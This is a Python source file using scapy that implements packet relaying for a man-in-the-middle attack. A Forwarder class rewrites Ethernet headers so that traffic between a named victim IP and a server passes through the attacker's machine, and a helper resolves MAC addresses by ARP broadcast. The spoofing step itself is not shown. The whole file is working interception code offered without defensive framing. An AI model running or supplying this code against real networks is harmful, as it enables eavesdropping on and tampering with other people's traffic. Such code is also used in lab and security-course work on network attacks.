import scapy.all as scapy
import threading

class Forwarder:

    def __init__(self, iface, victim_mac, victim_ip, server_ip, server_mac, attacker_mac, attacker_ip):
        self.iface = iface
        self.victim_mac = victim_mac
        self.victim_ip = victim_ip
        self.ip_to_spoof = server_ip
        self.mac_to_spoof = server_mac
        self.attacker_mac = attacker_mac
        self.attacker_ip = attacker_ip

    def forward(self, pkt):

        ip = pkt[scapy.IP]
        ether = pkt[scapy.Ether]

        # if the packet is from the victim to the server
        if ip.src == self.victim_ip:

            # forward the packet to the server
            ether.src = self.attacker_mac
            ether.dst = resolve_mac(self.ip_to_spoof, self.iface)
            scapy.sendp(ether / ip, iface=self.iface, verbose=False)

        # if the packet is from the server to the victim
        elif ip.src == self.ip_to_spoof:
            
            ether.src = self.attacker_mac
            ether.dst = self.victim_mac
            scapy.sendp(ether / ip, iface=self.iface, verbose=False)

def resolve_mac(ip, iface):
    """Sends an ARP request to resolve the MAC address for a given IP."""

    arp_req = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    ans, _ = scapy.srp(arp_req, timeout=2, iface=iface, verbose=False)

    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[!] Could not resolve MAC for {ip}")
        return None